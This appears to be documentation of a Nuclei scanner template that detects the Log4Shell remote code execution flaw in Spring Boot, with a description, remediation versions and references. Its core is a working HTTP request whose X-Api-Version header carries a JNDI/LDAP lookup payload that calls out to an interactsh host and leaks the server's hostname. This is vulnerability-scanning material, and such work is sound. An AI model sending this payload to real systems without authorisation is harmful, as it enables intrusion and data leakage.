# Nuclei Template: Spring Boot - Remote Code Execution (Apache Log4j)
**Template ID:** springboot-log4j-rce
**Vulnerability Class:** Deserialization of Untrusted Data
**Severity:** Critical
**CWE:** CWE-502
**Source:** Nuclei Template (`springboot-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Spring Boot is susceptible to remote code execution via Apache Log4j.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}
X-Api-Version: ${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.xapiversion.{{interactsh-url}}}
```

## Remediation
Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).

## References
- https://logging.apache.org/log4j/2.x/security.html
- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
